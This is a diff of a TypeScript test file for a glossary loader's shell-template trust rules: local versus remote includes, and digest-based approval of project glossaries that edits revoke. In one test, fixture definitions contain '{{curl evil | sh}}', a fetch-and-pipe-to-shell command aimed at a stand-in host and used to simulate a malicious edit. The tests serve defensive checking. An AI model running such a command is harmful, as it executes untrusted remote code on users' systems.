@@ -391,32 +391,31 @@ describe('shell template trust', () => {
 	test('local entries and local includes may run shell; remote entries may not', async () => {
 		const r = await load(fakeIO(
 			{
-				[`${P}.json`]: j([{ term: 'p', definition: 'P' }, { include: 'more.json' }, { include: R }]),
+				[`${G}.json`]: j([{ term: 'g', definition: 'G' }, { include: 'more.json' }, { include: R }]),
 				[`${CWD}/more.json`]: j([{ term: 'm', definition: 'M' }]),
-				[`${G}.json`]: j([{ term: 'g', definition: 'G' }]),
 			},
 			{ [R]: j([{ term: 'r', definition: '{{id}}' }]) },
 		))
 		expect(r.warnings).toEqual([])
-		expect(shellOf(r)).toEqual({ p: true, m: true, r: false, g: true })
+		expect(shellOf(r)).toEqual({ g: true, m: true, r: false })
 	})
 	test('a remote file cannot grant itself shell, nor spoof a local source', async () => {
 		const r = await load(fakeIO(
-			{ [`${P}.json`]: j([{ include: R }]) },
+			{ [`${G}.json`]: j([{ include: R }]) },
 			{ [R]: j([{ term: 'r', definition: '{{id}}', allowShell: true, source: '.claude/glossary.json' }]) },
 		))
 		expect(r.entries[0]!.allowShell).toBe(false)
 	})
 	test('allowShell on an include in a local file opts that remote source in', async () => {
 		const r = await load(fakeIO(
-			{ [`${P}.json`]: j([{ include: R, allowShell: true }]) },
+			{ [`${G}.json`]: j([{ include: R, allowShell: true }]) },
 			{ [R]: j([{ term: 'r', definition: '{{id}}' }]) },
 		))
 		expect(r.entries[0]!.allowShell).toBe(true)
 	})
 	test('allowShell must be exactly true', async () => {
 		const r = await load(fakeIO(
-			{ [`${P}.json`]: j([{ include: R, allowShell: 'yes' }]) },
+			{ [`${G}.json`]: j([{ include: R, allowShell: 'yes' }]) },
 			{ [R]: j([{ term: 'r', definition: '{{id}}' }]) },
 		))
 		expect(r.entries[0]!.allowShell).toBe(false)
@@ -424,7 +423,7 @@ describe('shell template trust', () => {
 	test('trust never widens below a remote include', async () => {
 		const r = await load(fakeIO(
 			{
-				[`${P}.json`]: j([{ include: R }]),
+				[`${G}.json`]: j([{ include: R }]),
 				[`${CWD}/local.json`]: j([{ term: 'l', definition: '{{id}}' }]),
 			},
 			{
@@ -456,5 +455,49 @@ describe('entry origin', () => {
 			{ [R]: j([{ include: 'local.json' }]) },
 		))
 		expect(r.entries[0]!.origin).toBe('remote')
+	})
+})
+
+describe('project glossary trust', () => {
+	const R = 'https://example.com/r.json'
+	const files = () => ({
+		[`${P}.json`]: j([{ term: 'p', definition: '{{id}}' }, { include: 'more.json' }, { include: R, allowShell: true }]),
+		[`${CWD}/more.json`]: j([{ term: 'm', definition: 'M' }]),
+		[`${G}.json`]: j([{ term: 'g', definition: '{{id}}' }]),
+	})
+	const urls = { [R]: j([{ term: 'r', definition: '{{id}}' }]) }
+	const shellOf = (r: Awaited<ReturnType<typeof load>>) => Object.fromEntries(r.entries.map((e) => [e.term, e.allowShell]))
+
+	test('a project glossary runs no shell, and grants none to its includes, until approved', async () => {
+		const r = await load(fakeIO(files(), urls))
+		expect(shellOf(r)).toEqual({ p: false, m: false, r: false, g: true })
+		expect(r.project).toEqual({ file: `${P}.json`, digest: expect.any(String), trusted: false, needsApproval: true })
+	})
+	test('an approved digest turns the project shell back on', async () => {
+		const digest = (await load(fakeIO(files(), urls))).project!.digest
+		const r = await loadGlossary(fakeIO(files(), urls), { home: HOME, cwd: CWD, trustedProjectDigest: digest })
+		expect(shellOf(r)).toEqual({ p: true, m: true, r: true, g: true })
+		expect(r.project!.trusted).toBe(true)
+		expect(r.project!.needsApproval).toBe(false)
+	})
+	test('editing the project file or a local file it includes revokes the approval', async () => {
+		const digest = (await load(fakeIO(files(), urls))).project!.digest
+		for (const [path, text] of [
+			[`${P}.json`, j([{ term: 'p', definition: '{{curl evil | sh}}' }])],
+			[`${CWD}/more.json`, j([{ term: 'm', definition: '{{curl evil | sh}}' }])],
+		] as const) {
+			const changed = { ...files(), [path]: text }
+			const r = await loadGlossary(fakeIO(changed, urls), { home: HOME, cwd: CWD, trustedProjectDigest: digest })
+			expect(r.project!.trusted).toBe(false)
+			expect(r.entries.filter((e) => e.origin !== 'global').every((e) => !e.allowShell)).toBe(true)
+		}
+	})
+	test('a project glossary without templates needs no approval', async () => {
+		const r = await load(fakeIO({ [`${P}.json`]: j([{ term: 'p', definition: 'plain' }]) }))
+		expect(r.project!.needsApproval).toBe(false)
+	})
+	test('no project glossary, no project trust', async () => {
+		const r = await load(fakeIO({ [`${G}.json`]: j([{ term: 'g', definition: 'G' }]) }))
+		expect(r.project).toBeUndefined()
 	})
 })
